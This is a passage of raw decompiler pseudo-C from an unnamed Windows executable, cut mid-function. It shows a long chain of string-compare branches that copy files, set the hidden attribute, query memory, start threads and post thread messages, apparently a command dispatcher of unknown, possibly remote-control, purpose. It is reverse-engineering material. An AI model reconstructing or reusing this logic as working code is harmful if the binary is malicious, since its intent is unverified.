iVar7 + 1;\n                                                    iVar12 = iVar12 + -1;\n                                                    uVar13 = iVar12 == 0;\n                                                } while (!uVar13);\n                                            }\n                                        }\n                                    }\n                                    else {\n                                        uVar13 = iVar3 == 1;\n                                        if (iVar3 < 2) {\n                                            var_330h = 0xffffffff;\n                                            var_334h = 0x495a72;\n                                            fcn.0040a588();\n                                            var_334h = 0x495a86;\n                                            fcn.00405784();\n                                            var_334h = 0x495a91;\n                                            var_334h = fcn.004058fc();\n                                            var_338h = 0x495a9a;\n                                            var_338h = fcn.004058fc();\n                                            var_33ch = 0x495aa0;\n                                            sub.kernel32.dll_CopyFileA();\n                                        }\n                                        else {\n                                            uVar13 = iVar3 == 0;\n                                            if (0 < iVar3) {\n                                                iVar7 = 1;\n                                                iVar12 = iVar3;\n                                                do {\n                                                    if (iVar3 == iVar7) {\n                                                        var_33ch = 0xffffffff;\n                                                        var_340h = 0x495a2a;\n                                                        fcn.0040a588();\n                                                        var_340h = 0x495a3e;\n                                                        fcn.00405784();\n                                                        var_340h = 0x495a49;\n                                                        var_340h = fcn.004058fc();\n                                                        var_344h = 0x495a52;\n                                                        var_338h = fcn.004058fc();\n                                                        var_348h = 0x495a58;\n                                                        sub.kernel32.dll_CopyFileA();\n                                                    }\n                                                    else {\n                                                        var_33ch = 0xffffffff;\n                                                        var_340h = &fcn.00493dac::var_390h;\n                                                        var_344h = 0x495986;\n                                                        fcn.00405a48();\n                                                        var_344h = 0x495996;\n                                                        fcn.00405964();\n                                                        var_344h = 0x4959a7;\n                                                        fcn.0040a588();\n                                                        var_344h = 0x4959bb;\n                                                        fcn.00405784();\n                                                        var_344h = 0x4959c6;\n                                                        var_344h = fcn.004058fc();\n                                                        var_348h = &fcn.00493dac::var_394h;\n                                                        var_34ch = 0x4959db;\n                                                        fcn.00405a48();\n                                                        var_34ch = 0x4959eb;\n                                                        fcn.00405964();\n                                                        var_34ch = 0x4959f6;\n                                                        var_338h = fcn.004058fc();\n                                                        var_350h = 0x4959fc;\n                                                        sub.kernel32.dll_CopyFileA();\n                                                        var_350h = 0x495a09;\n                                                        fcn.00405a48();\n                                                        var_350h = 0x495a18;\n                                                        fcn.004059a4();\n                                                    }\n                                                    iVar7 = iVar7 + 1;\n                                                    iVar12 = iVar12 + -1;\n                                                    uVar13 = iVar12 == 0;\n                                                } while (!uVar13);\n                                            }\n                                        }\n                                    }\n                                    var_33ch = 0x495aaa;\n                                    fcn.0040546c();\n                                    var_33ch = 0x495ab4;\n                                    fcn.004938a4();\n                                }\n                            }\n                            var_33ch = &fcn.00493dac::var_3a8h;\n                            var_340h = 0x495acd;\n                            fcn.00405964();\n                            var_340h = 0x495add;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_340h = 0x495af1;\n                                fcn.004059a4();\n                                var_340h = 0x495afe;\n                                fcn.004054c0();\n                            }\n                            var_340h = &fcn.00493dac::var_3ach;\n                            var_344h = 0x495b17;\n                            fcn.00405964();\n                            var_344h = 0x495b27;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_344h = 0x495b3f;\n                                fcn.004059a4();\n                                var_344h = 0;\n                                var_348h = 0x495b46;\n                                sub.ole32.dll_CoInitialize();\n                                var_348h = &fcn.00493dac::var_ch;\n                                var_34ch = 0x495b57;\n                                fcn.00405a48();\n                                var_34ch = 0x495b67;\n                                fcn.00405964();\n                                var_34ch = 0x495b74;\n                                fcn.00405a48();\n                                var_34ch = 0x495b83;\n                                fcn.004059a4();\n                                var_34ch = &fcn.00493dac::var_10h;\n                                var_350h = 0x495b94;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_350h = 0x495ba4;\n                                fcn.00405964();\n                                var_350h = 0x495bb1;\n                                fcn.00405a48();\n                                var_350h = 0x495bc0;\n                                fcn.004059a4();\n                                var_350h = 0x495bcb;\n                                fcn.00405504();\n                                var_350h = 0x495bd9;\n                                fcn.00484c94();\n                                var_350h = 0x495bde;\n                                sub.ole32.dll_CoUninitialize();\n                            }\n                            var_350h = &fcn.00493dac::var_3b0h;\n                            var_354h = 0x495bf7;\n                            fcn.00405964();\n                            var_354h = 0x495c07;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_354h = 0x495c1f;\n                                fcn.004059a4();\n                                var_354h = &fcn.00493dac::var_ch;\n                                var_358h = 0x495c30;\n                                fcn.00405a48();\n                                var_358h = 0x495c40;\n                                fcn.00405964();\n                                var_358h = 0x495c4d;\n                                fcn.00405a48();\n                                var_358h = 0x495c5c;\n                                fcn.004059a4();\n                                var_358h = 0x495c67;\n                                fcn.00405504();\n                                var_358h = 0x495c75;\n                                fcn.0040a49c();\n                                var_358h = 0x495c83;\n                                fcn.00405738();\n                                var_358h = 0x495c91;\n                                cVar1 = fcn.0048b7b0();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    var_358h = 0x495c9f;\n                                    fcn.004938a4();\n                                }\n                            }\n                            var_358h = &fcn.00493dac::var_3b8h;\n                            var_35ch = 0x495cb8;\n                            fcn.00405964();\n                            var_35ch = 0x495cc8;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_35ch = 0x495cdc;\n                                fcn.004059a4();\n                                var_35ch = &fcn.00493dac::var_ch;\n                                var_360h = 0x495ced;\n                                fcn.00405a48();\n                                var_360h = 0x495cfd;\n                                fcn.00405964();\n                                var_360h = 0x495d0a;\n                                fcn.00405a48();\n                                var_360h = 0x495d19;\n                                fcn.004059a4();\n                                var_360h = 0x495d24;\n                                fcn.00405504();\n                                var_360h = 0x495d2f;\n                                cVar1 = fcn.0048b7b0();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    var_360h = 0x495d3d;\n                                    fcn.004938a4();\n                                }\n                            }\n                            var_360h = &fcn.00493dac::var_3bch;\n                            var_364h = 0x495d56;\n                            fcn.00405964();\n                            var_364h = 0x495d66;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_364h = &fcn.00493dac::var_3c0h;\n                                var_368h = 0x495d8a;\n                                fcn.00405964();\n                                var_368h = 0x495d95;\n                                cVar1 = fcn.0048b794();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    var_368h = 0x495daf;\n                                    fcn.004938a4();\n                                }\n                                else {\n                                    var_368h = 0x495da3;\n                                    fcn.004938a4();\n                                }\n                            }\n                            var_368h = &fcn.00493dac::var_3c4h;\n                            var_36ch = 0x495dc8;\n                            fcn.00405964();\n                            var_36ch = 0x495dd8;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_36ch = 0x495dec;\n                                fcn.004059a4();\n                                var_36ch = 0x495df4;\n                                cVar1 = fcn.0048fc18();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    var_36ch = 0x49be90;\n                                    var_370h = var_8h;\n                                    var_374h = 0x49bea0;\n                                    var_378h = 0x495e15;\n                                    fcn.00405800();\n                                    var_378h = 0x495e20;\n                                    fcn.0048b0c8();\n                                }\n                                var_378h = 0x495e2a;\n                                fcn.004938a4();\n                            }\n                            var_378h = &fcn.00493dac::var_3cch;\n                            var_37ch = 0x495e43;\n                            fcn.00405964();\n                            var_37ch = 0x495e53;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_37ch = 0x495e67;\n                                fcn.004059a4();\n                                var_37ch = 2;\n                                var_380h = 0x495e71;\n                                var_380h = fcn.004058fc();\n                                var_384h = 0x495e77;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_384h = &fcn.00493dac::var_3d0h;\n                            var_388h = 0x495e90;\n                            fcn.00405964();\n                            var_388h = 0x495ea0;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_388h = 0x495eb4;\n                                fcn.004059a4();\n                                var_388h = 0x80;\n                                var_38ch = 0x495ec1;\n                                var_38ch = fcn.004058fc();\n                                var_390h = 0x495ec7;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_390h = 0x495ed4;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_390h = &fcn.00493dac::lpBuffer;\n                                var_394h = 0x495ee2;\n                                sub.kernel32.dll_GlobalMemoryStatus();\n                                var_394h = 0x49bed8;\n                                var_398h = 0x495eec;\n                                fcn.00484b38();\n                                var_398h = 0x495ef7;\n                                fcn.00409c6c();\n                                var_398h = var_3d8h;\n                                var_39ch = 0x49b8bc;\n                                var_3a0h = &fcn.00493dac::var_3dch;\n                                var_3e4h = var_234h;\n                                var_3e0h = var_3e0h & 0xffffff00;\n                                uVar13 = 1;\n                                var_3a4h = 0x495f2e;\n                                fcn.0040ae94(var_3a0h);\n                                var_3a4h = var_3dch;\n                                var_3a8h = 0x495f44;\n                                fcn.00405800();\n                                var_3a8h = 0x495f4f;\n                                fcn.004938a4();\n                            }\n                            var_390h = &fcn.00493dac::var_3e8h;\n                            var_394h = 0x495f68;\n                            fcn.00405964();\n                            var_394h = 0x495f78;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_394h = 0x495f90;\n                                fcn.004059a4();\n                                var_394h = &fcn.00493dac::var_ch;\n                                var_398h = 0x495fa1;\n                                fcn.00405a48();\n                                var_398h = 0x495fb1;\n                                fcn.00405964();\n                                var_398h = 0x495fbe;\n                                fcn.00405a48();\n                                var_398h = 0x495fcd;\n                                fcn.004059a4();\n                                var_398h = &fcn.00493dac::var_10h;\n                                var_39ch = 0x495fde;\n                                fcn.00405a48();\n                                var_39ch = 0x495fee;\n                                fcn.00405964();\n                                var_39ch = 0x495ffb;\n                                fcn.00405a48();\n                                var_39ch = 0x49600a;\n                                fcn.004059a4();\n                                var_39ch = &fcn.00493dac::var_14h;\n                                var_3a0h = 0x49601b;\n                                fcn.00405a48();\n                                var_3a0h = 0x49602b;\n                                fcn.00405964();\n                                var_3a0h = 0x496038;\n                                fcn.00405a48();\n                                var_3a0h = 0x496047;\n                                fcn.004059a4();\n                                var_3a0h = *0x4a4fc8;\n                                var_3a4h = 0x49605a;\n                                fcn.00405a48();\n                                var_3a4h = 0x49606a;\n                                fcn.00405964();\n                                var_3a4h = 0x496077;\n                                fcn.00405a48();\n                                var_3a4h = 0x496086;\n                                fcn.004059a4();\n                                var_3a4h = *0x4a4cb0;\n                                var_3a8h = 0x496099;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_3a8h = 0x4960a9;\n                                fcn.00405964();\n                                var_3a8h = 0x4960b6;\n                                fcn.00405a48();\n                                var_3a8h = 0x4960c5;\n                                fcn.004059a4();\n                                var_3a8h = 0x4960d2;\n                                fcn.004054c0();\n                                var_3a8h = 0xc;\n                                var_3ach = 0x40;\n                                var_3b0h = 0x4960db;\n                                iVar3 = sub.kernel32.dll_LocalAlloc_1();\n                                var_3b0h = 0x4960f3;\n                                var_1a0h = iVar3;\n                                fcn.004054c0();\n                                var_3b0h = 0x4960fe;\n                                fcn.004054c0();\n                                var_3b0h = 0x49610b;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    *(iVar3 + 8) = 1;\n                                }\n                                else {\n                                    *(iVar3 + 8) = 0;\n                                }\n                                **0x4a4d70 = 0;\n                                var_3b0h = &fcn.00493dac::var_4h;\n                                var_3b4h = 0;\n                                var_3b8h = var_1a0h;\n                                var_3bch = fcn.004933ec;\n                                var_3c0h = 0;\n                                var_3c4h = 0;\n                                var_3c8h = 0x49613a;\n                                var_3c8h = sub.kernel32.dll_CreateThread();\n                                var_3cch = 0x496140;\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            var_3cch = 0x49614d;\n                            fcn.00405894();\n                            if (uVar13) {\n                                **0x4a4d70 = 1;\n                            }\n                            var_3cch = &fcn.00493dac::var_3ech;\n                            var_3d0h = 0x496170;\n                            fcn.00405964();\n                            var_3d0h = 0x496180;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3d0h = 0x49618d;\n                                fcn.004848a8();\n                                var_3d0h = 0x4961a3;\n                                fcn.00405784();\n                                var_3d0h = 0x4961ae;\n                                fcn.004938a4();\n                            }\n                            var_3d0h = &fcn.00493dac::var_3f8h;\n                            var_3d4h = 0x4961c7;\n                            fcn.00405964();\n                            var_3d4h = 0x4961d7;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3d4h = 0x4961eb;\n                                fcn.004059a4();\n                                var_3d8h = 0x4961f7;\n                                var_3d4h = &stack0xfffffffc;\n                                fcn.0048af20();\n                                var_3d8h = 0x49620a;\n                                fcn.00493ce0(var_3d4h);\n                            }\n                            var_3d4h = &fcn.00493dac::var_400h;\n                            var_3d8h = 0x496224;\n                            fcn.00405964();\n                            var_3d8h = 0x496234;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3d8h = 0x49624c;\n                                fcn.004059a4();\n                                var_3d8h = &fcn.00493dac::var_ch;\n                                var_3dch = 0x49625d;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_3dch = 0x49626d;\n                                fcn.00405964();\n                                var_3dch = 0x49627a;\n                                fcn.00405a48();\n                                var_3dch = 0x496289;\n                                fcn.004059a4();\n                                var_3dch = 0x496294;\n                                fcn.00405504();\n                                var_3e0h = 0x49629d;\n                                var_3dch = &stack0xfffffffc;\n                                fcn.00409dd8();\n                                var_3e0h = 0x4962a8;\n                                fcn.0048bb88();\n                                var_3e0h = 0x4962bb;\n                                fcn.00493ce0(var_3dch);\n                            }\n                            var_3dch = &fcn.00493dac::var_408h;\n                            var_3e0h = 0x4962d5;\n                            fcn.00405964();\n                            var_3e0h = 0x4962e5;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3e0h = 0x4962fd;\n                                fcn.004059a4();\n                                var_3e0h = &fcn.00493dac::var_ch;\n                                var_3e4h = 0x49630e;\n                                fcn.00405a48();\n                                var_3e4h = 0x49631e;\n                                fcn.00405964();\n                                var_3e4h = 0x49632b;\n                                fcn.00405a48();\n                                var_3e4h = 0x49633a;\n                                fcn.004059a4();\n                                var_3e4h = 0x496342;\n                                iVar3 = fcn.00409dd8();\n                                uVar13 = iVar3 == 0;\n                                if (0 < iVar3) {\n                                    iVar7 = 1;\n                                    iVar12 = iVar3;\n                                    do {\n                                        if (iVar3 == iVar7) {\n                                            var_3e4h = 0x4963ad;\n                                            fcn.00409dd8();\n                                            var_3e4h = 0x4963b2;\n                                            fcn.0048abec();\n                                        }\n                                        else {\n                                            var_3e0h = &fcn.00493dac::var_40ch;\n                                            var_3e8h = 0x496367;\n                                            fcn.00405a48();\n                                            var_3e8h = 0x496377;\n                                            fcn.00405964();\n                                            var_3e8h = 0x496382;\n                                            fcn.00409dd8();\n                                            var_3e8h = 0x496387;\n                                            fcn.0048abec();\n                                            var_3e8h = 0x496394;\n                                            fcn.00405a48();\n                                            var_3e8h = 0x4963a3;\n                                            fcn.004059a4();\n                                        }\n                                        iVar7 = iVar7 + 1;\n                                        iVar12 = iVar12 + -1;\n                                        uVar13 = iVar12 == 0;\n                                    } while (!uVar13);\n                                }\n                                var_3e4h = 0x4963c0;\n                                fcn.004938a4();\n                            }\n                            var_3e4h = &fcn.00493dac::var_410h;\n                            var_3e8h = 0x4963d9;\n                            fcn.00405964();\n                            var_3e8h = 0x4963e9;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3e8h = 0x496401;\n                                fcn.004059a4();\n                                var_3e8h = 0x49640d;\n                                var_1b4h = fcn.00404610();\n                                var_3ech = 0x496491;\n                                var_3f0h = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &fcn.00493dac::var_3f0h;\n                                var_3f4h = 0x49642f;\n                                var_3e8h = &stack0xfffffffc;\n                                (**(*var_1b4h + 0x2c))();\n                                do {\n                                    var_3f4h = 0x496442;\n                                    (**(*var_1b4h + 0xc))();\n                                    var_3f4h = 0x49644d;\n                                    fcn.00409dd8();\n                                    var_3f4h = 0x496452;\n                                    fcn.0048abec();\n                                    var_3f4h = 0x49645f;\n                                    (**(*var_1b4h + 0x48))();\n                                    var_3f4h = 0x49646a;\n                                    iVar3 = (**(*var_1b4h + 0x14))();\n                                } while (iVar3 != 0);\n                                var_3f4h = 0x496478;\n                                fcn.004938a4();\n                                *in_FS_OFFSET = var_3f0h;\n                                var_3e8h = 0x496498;\n                                var_3ech = 0x496490;\n                                fcn.00404640();\n                                return;\n                            }\n                            var_3e8h = &fcn.00493dac::var_418h;\n                            var_3ech = 0x4964b1;\n                            fcn.00405964();\n                            var_3ech = 0x4964c1;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3ech = 0x4964d5;\n                                fcn.004059a4();\n                                var_3ech = 0x4964dd;\n                                fcn.00409dd8();\n                                var_3ech = 0x4964e2;\n                                fcn.0048abec();\n                                var_3ech = 0x4964ec;\n                                fcn.004938a4();\n                            }\n                            var_3ech = &fcn.00493dac::var_41ch;\n                            var_3f0h = 0x496505;\n                            fcn.00405964();\n                            var_3f0h = 0x496515;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_3f0h = 0x49652d;\n                                fcn.004059a4();\n                                var_3f0h = &fcn.00493dac::var_ch;\n                                var_3f4h = 0x49653e;\n                                fcn.00405a48();\n                                var_3f4h = 0x49654e;\n                                fcn.00405964();\n                                var_3f4h = 0x49655b;\n                                fcn.00405a48();\n                                var_3f4h = 0x49656a;\n                                fcn.004059a4();\n                                var_3f4h = &fcn.00493dac::var_10h;\n                                var_3f8h = 0x49657b;\n                                fcn.00405a48();\n                                var_3f8h = 0x49658b;\n                                fcn.00405964();\n                                var_3f8h = 0x496598;\n                                fcn.00405a48();\n                                var_3f8h = 0x4965a7;\n                                fcn.004059a4();\n                                var_3f8h = &fcn.00493dac::var_14h;\n                                var_3fch = 0x4965b8;\n                                fcn.00405a48();\n                                var_3fch = 0x4965c8;\n                                fcn.00405964();\n                                var_3fch = 0x4965d5;\n                                fcn.00405a48();\n                                var_3fch = 0x4965e4;\n                                fcn.004059a4();\n                                var_3fch = &fcn.00493dac::var_18h;\n                                var_400h = 0x4965f5;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_400h = 0x496605;\n                                fcn.00405964();\n                                var_400h = 0x496612;\n                                fcn.00405a48();\n                                var_400h = 0x496621;\n                                fcn.004059a4();\n                                var_400h = 0x49662c;\n                                fcn.00405504();\n                                var_404h = 0x49663e;\n                                var_400h = &stack0xfffffffc;\n                                fcn.00484140();\n                                var_404h = var_424h;\n                                var_408h = 0x49b8bc;\n                                var_40ch = 0x49665a;\n                                fcn.00484200();\n                                var_40ch = var_428h;\n                                var_410h = 0x496670;\n                                fcn.00405800();\n                                var_410h = 0x496681;\n                                fcn.00493ce0(var_40ch);\n                            }\n                            var_40ch = &fcn.00493dac::var_42ch;\n                            var_410h = 0x49669b;\n                            fcn.00405964();\n                            var_410h = 0x4966ab;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_410h = 0x4966c3;\n                                fcn.004059a4();\n                                var_410h = &fcn.00493dac::var_ch;\n                                var_414h = 0x4966d9;\n                                fcn.00405964();\n                                var_414h = 0x4966eb;\n                                fcn.004059a4();\n                                var_414h = &fcn.00493dac::var_10h;\n                                var_418h = 0x4966fc;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_418h = 0x49670c;\n                                fcn.00405964();\n                                var_418h = 0x496719;\n                                fcn.00405a48();\n                                var_418h = 0x496728;\n                                fcn.004059a4();\n                                var_418h = 0x496736;\n                                fcn.0048be60();\n                            }\n                            var_418h = &fcn.00493dac::var_430h;\n                            var_41ch = 0x49674f;\n                            fcn.00405964();\n                            var_41ch = 0x49675f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_41ch = 0x496773;\n                                fcn.004059a4();\n                                uVar13 = var_8h == NULL || var_8h == 0x4;\n                                var_41ch = &fcn.00493dac::var_434h;\n                                var_420h = 0x496795;\n                                fcn.00405964();\n                                var_420h = var_434h;\n                                var_424h = &fcn.00493dac::var_438h;\n                                var_428h = 0x4967b5;\n                                fcn.00405964();\n                                var_424h = 0x4967c1;\n                                fcn.0048bfc8();\n                            }\n                            var_424h = &fcn.00493dac::var_43ch;\n                            var_428h = 0x4967da;\n                            fcn.00405964();\n                            var_428h = 0x4967ea;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_428h = 0x4967fe;\n                                fcn.004059a4();\n                                uVar13 = var_8h == NULL || var_8h == 0x4;\n                                var_428h = &fcn.00493dac::var_440h;\n                                var_42ch = 0x496820;\n                                fcn.00405964();\n                                var_42ch = var_440h;\n                                var_430h = &fcn.00493dac::var_444h;\n                                var_434h = 0x496840;\n                                fcn.00405964();\n                                var_430h = 0x49684c;\n                                fcn.0048bce0();\n                            }\n                            var_430h = &fcn.00493dac::var_448h;\n                            var_434h = 0x496865;\n                            fcn.00405964();\n                            var_434h = 0x496875;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_434h = 0x49688d;\n                                fcn.004059a4();\n                                var_434h = &fcn.00493dac::var_ch;\n                                var_438h = 0x49689e;\n                                fcn.00405a48();\n                                var_438h = 0x4968ae;\n                                fcn.00405964();\n                                var_438h = 0x4968bb;\n                                fcn.00405a48();\n                                var_438h = 0x4968ca;\n                                fcn.004059a4();\n                                var_438h = &fcn.00493dac::var_10h;\n                                var_43ch = 0x4968db;\n                                fcn.00405a48();\n                                var_43ch = 0x4968eb;\n                                fcn.00405964();\n                                var_43ch = 0x4968f8;\n                                fcn.00405a48();\n                                var_43ch = 0x496907;\n                                fcn.004059a4();\n                                var_43ch = &fcn.00493dac::var_14h;\n                                var_440h = 0x496918;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_440h = 0x496928;\n                                fcn.00405964();\n                                var_440h = 0x496935;\n                                fcn.00405a48();\n                                var_440h = 0x496944;\n                                fcn.004059a4();\n                                var_440h = var_8h;\n                                var_444h = 0x496956;\n                                fcn.004847ac(var_8h);\n                            }\n                            var_444h = &fcn.00493dac::var_44ch;\n                            var_448h = 0x49696f;\n                            fcn.00405964();\n                            var_448h = 0x49697f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_448h = 0x496997;\n                                fcn.004059a4();\n                                var_448h = &fcn.00493dac::var_ch;\n                                var_44ch = 0x4969a8;\n                                fcn.00405a48();\n                                var_44ch = 0x4969b8;\n                                fcn.00405964();\n                                var_44ch = 0x4969c5;\n                                fcn.00405a48();\n                                var_44ch = 0x4969d4;\n                                fcn.004059a4();\n                                var_44ch = &fcn.00493dac::var_10h;\n                                var_450h = 0x4969e5;\n                                fcn.00405a48();\n                                var_450h = 0x4969f5;\n                                fcn.00405964();\n                                var_450h = 0x496a02;\n                                fcn.00405a48();\n                                var_450h = 0x496a11;\n                                fcn.004059a4();\n                                var_450h = &fcn.00493dac::var_14h;\n                                var_454h = 0x496a22;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_454h = 0x496a32;\n                                fcn.00405964();\n                                var_454h = 0x496a3f;\n                                fcn.00405a48();\n                                var_454h = 0x496a4e;\n                                fcn.004059a4();\n                                var_454h = var_8h;\n                                lParam = 0x496a60;\n                                fcn.004845e0(var_8h);\n                            }\n                            lParam = &fcn.00493dac::var_450h;\n                            var_45ch = 0x496a79;\n                            fcn.00405964();\n                            var_45ch = 0x496a89;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_45ch = 0x496aa1;\n                                fcn.004059a4();\n                                var_45ch = &fcn.00493dac::var_ch;\n                                var_460h = 0x496ab2;\n                                fcn.00405a48();\n                                var_460h = 0x496ac2;\n                                fcn.00405964();\n                                var_460h = 0x496acf;\n                                fcn.00405a48();\n                                var_460h = 0x496ade;\n                                fcn.004059a4();\n                                var_460h = &fcn.00493dac::var_10h;\n                                var_464h = 0x496aef;\n                                fcn.00405a48();\n                                var_464h = 0x496aff;\n                                fcn.00405964();\n                                var_464h = 0x496b0c;\n                                fcn.00405a48();\n                                var_464h = 0x496b1b;\n                                fcn.004059a4();\n                                var_464h = &fcn.00493dac::var_14h;\n                                var_468h = 0x496b2c;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_468h = 0x496b3c;\n                                fcn.00405964();\n                                var_468h = 0x496b49;\n                                fcn.00405a48();\n                                var_468h = 0x496b58;\n                                fcn.004059a4();\n                                var_468h = var_8h;\n                                var_46ch = 0x496b6a;\n                                fcn.004846c8(var_8h);\n                            }\n                            var_46ch = &fcn.00493dac::var_454h;\n                            var_470h = 0x496b83;\n                            fcn.00405964();\n                            var_470h = 0x496b93;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_470h = 0x496bab;\n                                fcn.004059a4();\n                                var_470h = *0x4a4f24;\n                                var_474h = 0x496bbe;\n                                fcn.00405a48();\n                                var_474h = 0x496bce;\n                                fcn.00405964();\n                                var_474h = 0x496bdb;\n                                fcn.00405a48();\n                                var_474h = 0x496bea;\n                                fcn.004059a4();\n                                var_474h = *0x4a4f74;\n                                var_478h = 0x496bfd;\n                                fcn.00405a48();\n                                var_478h = 0x496c0d;\n                                fcn.00405964();\n                                var_478h = 0x496c1a;\n                                fcn.00405a48();\n                                var_478h = 0x496c29;\n                                fcn.004059a4();\n                                var_478h = *0x4a4d40;\n                                var_47ch = 0x496c3c;\n                                fcn.00405a48();\n                                var_47ch = 0x496c4c;\n                                fcn.00405964();\n                                var_47ch = 0x496c59;\n                                fcn.00405a48();\n                                var_47ch = 0x496c68;\n                                fcn.004059a4();\n                                var_47ch = *0x4a4bdc;\n                                var_480h = 0x496c7b;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_480h = 0x496c8b;\n                                fcn.00405964();\n                                var_480h = 0x496c98;\n                                fcn.00405a48();\n                                var_480h = 0x496ca7;\n                                fcn.004059a4();\n                                var_480h = 0x496cb2;\n                                fcn.00405504();\n                                var_480h = 0x496cbf;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    uVar13 = **0x4a4bd4 == 0;\n                                    if (!uVar13) {\n                                        var_1e0h = **0x4a4bdc;\n                                        uVar13 = var_1e0h == NULL;\n                                        wParam = var_1e0h;\n                                        if (!uVar13) {\n                                            uVar13 = var_1e0h + -1 == NULL;\n                                            wParam = var_1e0h[-1];\n                                        }\n                                        var_480h = 0x496d0e;\n                                        var_480h = fcn.004058fc();\n                                        var_484h = wParam;\n                                        var_488h = 6;\n                                        var_48ch = **0x4a4bd4;\n                                        var_490h = 0x496d25;\n                                        sub.user32.dll_PostThreadMessageW();\n                                    }\n                                }\n                                else {\n                                    var_480h = 0x496d34;\n                                    fcn.00405894();\n                                    if ((uVar13) && (uVar13 = **0x4a4bd4 == 0,  uVar13)) {\n                                        var_480h = *0x4a4c00;\n                                        var_484h = NULL;\n                                        var_488h = 0;\n                                        var_48ch = 0x492e94;\n                                        var_490h = 0;\n                                        var_494h = 0;\n                                        var_498h = 0x496d58;\n                                        sub.kernel32.dll_CreateThread();\n                                        var_498h = *0x4a4bd4;\n                                        var_49ch = 0;\n                                        var_4a0h = 0;\n                                        var_4a4h = fcn.00492b78;\n                                        var_4a8h = 0;\n                                        var_4ach = 0;\n                                        var_4b0h = 0x496d70;\n                                        sub.kernel32.dll_CreateThread();\n                                        var_4b0h = 0x496d7a;\n                                        fcn.004938a4();\n                                    }\n                                }\n                            }\n                            var_4b0h = 0x496d87;\n                            fcn.00405894();\n                            if ((uVar13) && (uVar13 = **0x4a4bd4 == 0,  !uVar13)) {\n                                var_4b0h = 0x496da3;\n                                fcn.00405664();\n                                var_4b0h = lParam;\n                                var_4b4h = 0x4;\n                                var_4b8h = 0x6;\n                                var_4bch = **0x4a4bd4;\n                                var_4c0h = 0x496dbb;\n                                sub.user32.dll_PostThreadMessageW();\n                            }\n                            var_4b0h = &fcn.00493dac::var_45ch;\n                            var_4b4h = 0x496dd4;\n                            fcn.00405964();\n                            var_4b4h = 0x496de4;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_4b4h = 0x496dfc;\n                                fcn.004059a4();\n                                var_4b4h = &fcn.00493dac::var_ch;\n                                var_4b8h = 0x496e0d;\n                                fcn.00405a48();\n                                var_4b8h = 0x496e1d;\n                                fcn.00405964();\n                                var_4b8h = 0x496e2a;\n                                fcn.00405a48();\n                                var_4b8h = 0x496e39;\n                                fcn.004059a4();\n                                var_4b8h = &fcn.00493dac::var_10h;\n                                var_4bch = 0x496e4a;\n                                fcn.00405a48();\n                                var_4bch = 0x496e5a;\n                                fcn.00405964();\n                                var_4bch = 0x496e67;\n                                fcn.00405a48();\n                                var_4bch = 0x496e76;\n                                fcn.004059a4();\n                                var_4bch = &fcn.00493dac::var_14h;\n                                var_4c0h = 0x496e87;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_4c0h = 0x496e97;\n                                fcn.00405964();\n                                var_4c0h = 0x496ea4;\n                                fcn.00405a48();\n                                var_4c0h = 0x496eb3;\n                                fcn.004059a4();\n                                var_4c0h = 0x496ebe;\n                                fcn.00405504();\n                                var_4c0h = 0x496ecb;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    var_4c4h = 0x496ed9;\n                                    var_4c0h = &stack0xfffffffc;\n                                    fcn.00483d44();\n                                    var_4c4h = &fcn.00493dac::var_460h;\n                                    var_4c8h = 0x496eeb;\n                                    fcn.00483f70();\n                                    var_4c4h = 0x496ef7;\n                                    fcn.00405738();\n                                    var_4c4h = 0x496f08;\n                                    fcn.00493ce0(var_4c0h);\n                                }\n                                else {\n                                    var_4c4h = 0x496f17;\n                                    var_4c0h = &stack0xfffffffc;\n                                    fcn.00483d44();\n                                    var_4c4h = 0x496f28;\n                                    fcn.00493ce0(var_4c0h);\n                                }\n                            }\n                            var_4c0h = &fcn.00493dac::var_46ch;\n                            var_4c4h = 0x496f42;\n                            